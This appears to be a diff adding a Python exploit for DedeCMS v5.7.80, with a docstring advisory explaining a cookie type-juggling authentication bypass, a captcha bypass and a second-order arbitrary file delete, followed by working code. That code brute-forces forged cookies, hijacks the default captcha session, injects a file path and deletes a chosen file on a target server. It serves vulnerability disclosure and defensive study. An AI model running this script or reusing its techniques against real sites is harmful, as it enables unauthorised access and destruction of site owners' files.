@@ -1,0 +1,420 @@
+#!/usr/bin/python3
+"""
+# Dedecms GetCookie Type Juggling Authentication Bypass Vulnerability
+## Tested on: v5.7.80 release
+## Released as zero-day due to a lack of response:
+
+2021-10-21 - Sent to opensource@dedecms.com
+2021-11-08 - No response, sent a reminder to opensource@dedecms.com
+2021-11-22 - No response, public dislcosure
+
+## Summary:
+
+The vulnerability chain allows unauthenticated attackers to delete arbitrary files from the target system. Although authentication is required, the existing authentication mechanism can be bypassed. This vulnerability can be leveraged to cause a denial of service.
+
+## Notes:
+
+- The config member open setting, $cfg_mb_open needs to be set to 'Y'. The default is 'N'.
+- The second vulnerability requires that php-gd is not installed on the target system
+
+## Vulnerability Analysis:
+
+There are three bugs used in this chain:
+
+1. cookie.helper GetCookie Type Juggling Authentication Bypass Vulnerability
+   Found by: Steven Seeley of Qihoo 360 Vulcan Team
+2. vdimgck echo_validate_image captcha bypass Vulnerability
+   Found by: Steven Seeley of Qihoo 360 Vulcan Team
+3. inc_batchup DelArc Arbitrary File Delete Vulnerability
+   Found by: <redacted>
+
+### cookie.helper GetCookie Type Juggling Authentication Bypass Vulnerability
+CVSS: 7.3 (/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L)
+
+There are several parts of the code that perform the authentication check, but for this I will focus on the `plus/stow.php` script:
+
+```php
+$ml = new MemberLogin(); // 1
+
+if ($ml->M_ID == 0) { // 2
+    ShowMsg('只有用户才允许收藏操作！', 'javascript:window.close();');
+    exit();
+}
+```
+
+This code creates a new `MemberLogin` instance at [1] and either calls `IsLogin` or checks `M_ID` != 0 at [2]. The `IsLogin` function just returns true if the `M_ID` is > 0. Inside of the `include/memberlogin.class.php` script:
+
+```php
+class MemberLogin
+{
+    //...
+    function __construct($kptime = -1, $cache=FALSE)
+    {
+        //...
+        $this->M_ID = $this->GetNum(GetCookie("DedeUserID")); // 3
+        //...
+    }
+    //...
+    function IsLogin()
+    {
+        if($this->M_ID > 0) return TRUE;
+        else return FALSE;
+    }
+```
+
+The `M_ID` is set at [3] from `GetCookie` and `GetNum` just converts it to a number. Inside of the `include/helpers/cookie.helper.php` script:
+
+```php
+if ( ! function_exists('GetCookie'))
+{
+    function GetCookie($key)
+    {
+        global $cfg_cookie_encode;
+        if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'1BH21ANI1AGD297L1FF21LN02BGE1DNG']) )
+        {
+            return '';
+        }
+        else
+        {
+            if($_COOKIE[$key.'1BH21ANI1AGD297L1FF21LN02BGE1DNG']!=substr(md5($key.$cfg_cookie_encode.$_COOKIE[$key]),0,16)) // 4
+            {
+                return '';
+            }
+            else
+            {
+                return $_COOKIE[$key];
+            }
+        }
+    }
+}
+```
+
+We can see the juggle at [4] with `!=`. This is enough to juggle the cookie DedeUserID__ckMd5 using the DedeUserID cookie with can result in an authentication bypass.
+
+### vdimgck echo_validate_image captcha bypass Vulnerability
+
+Inside of ./include/vdimgck.php, there is a weakness:
+
+```php
+if (!echo_validate_image($config))
+{
+    // 如果不成功则初始化一个默认验证码
+    @session_start();
+    $_SESSION['securimage_code_value'] = strtolower('abcd');
+    $im = @imagecreatefromjpeg(dirname(__FILE__).'/data/vdcode.jpg');
+    header("Pragma:no-cache\r\n");
+    header("Cache-Control:no-cache\r\n");
+    header("Expires:0\r\n");
+    imagejpeg($im);
+    imagedestroy($im);
+}
+
+function echo_validate_image( $config = array() )
+{
+    @session_start();
+
+    if ( !function_exists('imagettftext') )
+    {
+        return false;
+    }
+    //...
+```
+
+if php-gd isn't installed, then this function will not exist! Not the cleanest bypass, but good enough for a fun exploit :P
+
+### inc_batchup DelArc Arbitrary File Delete Vulnerability
+
+Inside of `member/inc/inc_batchup.php` we see:
+
+```php
+function DelArc($aid)
+{
+    global $dsql,$cfg_cookie_encode,$cfg_ml,$cfg_upload_switch,$cfg_medias_dir;
+    $aid = intval($aid);
+
+    //读取文档信息
+    $arctitle = '';
+    $arcurl = '';
+
+    $arcQuery = "SELECT arc.*,ch.addtable,tp.typedir,tp.typename,tp.namerule,tp.namerule2,tp.ispart,tp.moresite,tp.siteurl,tp.sitepath,ch.nid
+          FROM `#@__archives` arc
+          LEFT JOIN `#@__arctype` tp ON tp.id=arc.typeid
+          LEFT JOIN `#@__channeltype` ch ON ch.id=arc.channel
+        WHERE arc.id='$aid' ";
+    $arcRow = $dsql->GetOne($arcQuery);
+    if(!is_array($arcRow))
+    {
+        return false;
+    }
+
+    //删除数据库的内容
+    //$dsql->ExecuteNoneQuery(" DELETE FROM `#@__arctiny` WHERE id='$aid' ");
+    if($arcRow['addtable']!='')
+    {
+        //判断删除文章附件变量是否开启；
+        if($cfg_upload_switch == 'Y')
+        {
+            //判断文章属性；
+            switch($arcRow['nid'])
+            {
+                case "image":
+                    $nid = "imgurls";
+                    break;
+                case "article":
+                    $nid = "body";
+                    break;
+                case "soft":
+                    $nid = "softlinks";
+                    break;
+                case "shop":
+                    $nid = "body";
+                    break;
+                default:
+                    $nid = "";
+                    break;
+            }
+            if($nid !="")
+            {
+                $row = $dsql->GetOne("SELECT $nid FROM ".$arcRow['addtable']." WHERE aid = '$aid'");
+                $licp = $dsql->GetOne("SELECT litpic FROM `#@__archives` WHERE id = '$aid'");
+                if($licp['litpic'] != "")
+                {
+                    $litpic = DEDEROOT.$licp['litpic'];
+                    if(file_exists($litpic) && !is_dir($litpic))
+                    {
+                        @unlink($litpic); // 1
+                    }
+```
+
+The `unlink` at [1] is reachable by using the `member/archives_do.php` script:
+
+```php
+else if($dopost=="delArc")
+{
+    CheckRank(0,0);
+    include_once(DEDEMEMBER."/inc/inc_batchup.php");
+    $ENV_GOBACK_URL = empty($_COOKIE['ENV_GOBACK_URL']) ? 'content_list.php?channelid=' : $_COOKIE['ENV_GOBACK_URL'];
+
+
+    $equery = "SELECT arc.channel,arc.senddate,arc.arcrank,ch.maintable,ch.addtable,ch.issystem,ch.arcsta FROM `#@__arctiny` arc
+               LEFT JOIN `#@__channeltype` ch ON ch.id=arc.channel WHERE arc.id='$aid' ";
+
+    $row = $dsql->GetOne($equery);
+    if(!is_array($row))
+    {
+        ShowMsg("你没有权限删除这篇文档！","-1");
+        exit();
+    }
+    if(trim($row['maintable'])=='') $row['maintable'] = '#@__archives';
+    if($row['issystem']==-1)
+    {
+        $equery = "SELECT mid FROM `{$row['addtable']}` WHERE aid='$aid' AND mid='".$cfg_ml->M_ID."' ";
+    }
+    else
+    {
+        $equery = "SELECT mid,litpic from `{$row['maintable']}` WHERE id='$aid' AND mid='".$cfg_ml->M_ID."' ";
+    }
+    $arr = $dsql->GetOne($equery);
+    if(!is_array($arr))
+    {
+        ShowMsg("你没有权限删除这篇文档！","-1");
+        exit();
+    }
+
+    if($row['arcrank']>=0)
+    {
+        $dtime = time();
+        $maxtime = $cfg_mb_editday * 24 *3600;
+        if($dtime - $row['senddate'] > $maxtime)
+        {
+            ShowMsg("这篇文档已经锁定，你不能再删除它！","-1");
+            exit();
+        }
+    }
+
+    $channelid = $row['channel'];
+    $row['litpic'] = (isset($arr['litpic']) ? $arr['litpic'] : '');
+
+    //删除文档
+    if($row['issystem']!=-1) $rs = DelArc($aid);  // 2
+```
+
+`DelArc` can be reached with a request like so:
+
+```
+GET /member/archives_do.php?aid=XXX&dopost=delArc HTTP/1.1
+Host: target
+```
+
+But we need a way to poison the `litpic` variable. The answer is in the `member/album_add.php` script:
+
+```php
+    if($formhtml==1)
+    {
+        $imagebody = stripslashes($imagebody);
+        $imgurls .= GetCurContentAlbum($imagebody,$copysource,$litpicname);
+        if($ddisfirst==1 && $litpic=='' && !empty($litpicname))
+        {
+            $litpic = $litpicname;
+            $hasone = true;
+        }
+    }
+```
+
+Then later in the script we see:
+
+```php
+    $inQuery = "INSERT INTO `#@__archives`(id,typeid,sortrank,flag,ismake,channel,arcrank,click,money,title,shorttitle,
+color,writer,source,litpic,pubdate,senddate,mid,description,keywords,mtype)
+VALUES ('$arcID','$typeid','$sortrank','$flag','$ismake','$channelid','$arcrank','0','$money','$title','$shorttitle',
+'$color','$writer','$source','$litpic','$pubdate','$senddate','$mid','$description','$keywords','$mtypesid'); ";
+    if(!$dsql->ExecuteNoneQuery($inQuery))
+    {
+        $gerr = $dsql->GetError();
+        $dsql->ExecuteNoneQuery("DELETE FROM `#@__arctiny` WHERE id='$arcID' ");
+        ShowMsg("把数据保存到数据库主表 `#@__archives` 时出错，请联系管理员。","javascript:;");
+        exit();
+    }
+```
+
+`$litpic` is unchecked when being inserted into the database. This results in a second order file deletion.
+
+# Proof of Concept:
+
+It took just under 10 minutes in my testing to bypass authentication against a stock Apache2 server and delete the admin login page.
+
+```
+researcher@neophyte:~$ time ./poc.py 2 192.168.184.175 dede/login.php
+(+) remember, patience is a virtue
+(+) targeting user id: 2
+(+) found: DedeUserID=2bzyi;DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0
+(+) done! setting up file delete
+(+) setting up second order delete!
+(+) deleting file install/lol.txt!
+
+real    4m57.724s
+user    1m25.482s
+sys     0m18.718s
+```
+
+# Timeline:
+
+- 21/10/2021: Reported to opensource@dedecms.com.
+- 08/11/2021: No response, reminded developer of the existing vulnerability.
+- 22/11/2021: No response, public dislcosure.
+"""
+
+import string
+import re
+import itertools
+import requests
+import sys
+import random
+import time
+import hashlib
+import threading
+from queue import Queue
+
+def get_cookies(member, code):
+    c = {
+        "DedeUserID" : member + code,
+        "DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG" : "0", # juggle
+    }
+    return c
+
+def bypass_authentication(target, member, code):
+    global found
+    global counter
+    if (found == False):
+        counter += 1
+        print("(+) attempt %d using: %s" % (counter, code), end='\r')
+    try:
+        r = requests.head("http://%s/plus/stow.php" % target, params={"aid":"1"}, cookies=get_cookies(member, code))
+        if re.search("DedeLoginTime=(\d*);", r.headers["Set-Cookie"]):
+            print("(+) found: DedeUserID=%s;DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0" % (member + code))
+            found = code
+    except requests.exceptions.RequestException as e:
+        pass
+
+def worker(target, member, code_queue):
+    while (found == False):
+        code = code_queue.get()
+        bypass_authentication(target, member, code)
+        code_queue.task_done()
+
+def id_generator(size=4, chars=string.ascii_lowercase):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+def get_captcha(target):
+    r = requests.get("http://%s/include/vdimgck.php" % target, stream=True)
+    s = hashlib.sha1()
+    s.update(r.content)
+    if (s.hexdigest() == "c9393ece94bee5f61066a938894e6744b7a18fff"):
+        match = re.search("PHPSESSID=(.*);", r.headers['set-cookie'])
+        if match:
+            return ["abcd", match.group(1)]
+    # add a prompt here to capture the code from the attacker if you don't want to use bug #2
+    return None
+
+def inject_delete(target, captcha, file_to_delete, member, code):
+    p = {
+        "title" : id_generator(),
+        "vdcode" : captcha[0],
+        "formhtml" : "1",
+        "typeid" : "13",   # don't change, works on default
+        "channelid" : "2", # don't change, works on default
+        "litpicname" : "/%s" % file_to_delete,
+        "dopost" : "save"
+    }
+    c = get_cookies(member, code)
+    c["PHPSESSID"] = captcha[1]
+    r = requests.get("http://%s/member/album_add.php" % target, params=p, cookies=c)
+    match = re.search("view.php\?aid=(\d*)", r.text)
+    if match:
+        return match.group(1)
+    return None
+
+def delete_file(target, aid, captcha, member, code):
+    c = get_cookies(member, code)
+    c["PHPSESSID"] = captcha[1]
+    p = {
+        "aid" : aid,
+        "dopost" : "delArc"
+    }
+    requests.get("http://%s/member/archives_do.php" % target, params=p, cookies=c)
+
+def main():
+    if(len(sys.argv) < 4):
+        print("(+) usage: %s <id> <target> <file>" % sys.argv[0])
+        print("(+) eg: %s 2 192.168.184.175 dede/login.php" % sys.argv[0])
+        sys.exit(1)
+    member = sys.argv[1]
+    target = sys.argv[2]
+    rmfile = sys.argv[3]
+    print("(+) remember, patience is a virtue")
+    print("(+) targeting user id: %s" % member)
+    code_queue = Queue()
+    # we use 4 as the standard bruteforce here
+    for key in map(''.join, itertools.product(string.ascii_lowercase, repeat=4)):
+        code_queue.put(key)
+    for i in range(8):
+         t = threading.Thread(target=worker, args=[target, member, code_queue])
+         t.start()
+    while(found == False):
+        time.sleep(0.1)
+    print("(+) done! setting up file delete")
+    captcha = get_captcha(target)
+    if captcha != None:
+        print("(+) setting up second order delete!")
+        aid = inject_delete(target, captcha, rmfile, member, found)
+        if aid:
+            print("(+) deleting file %s!" % rmfile)
+            delete_file(target, aid, captcha, member, found)
+        else:
+            print("(-) failed to delete file: %s" % rmfile)    
+    
+if __name__ == "__main__":
+    counter = 0
+    found = False  
+    main()
+
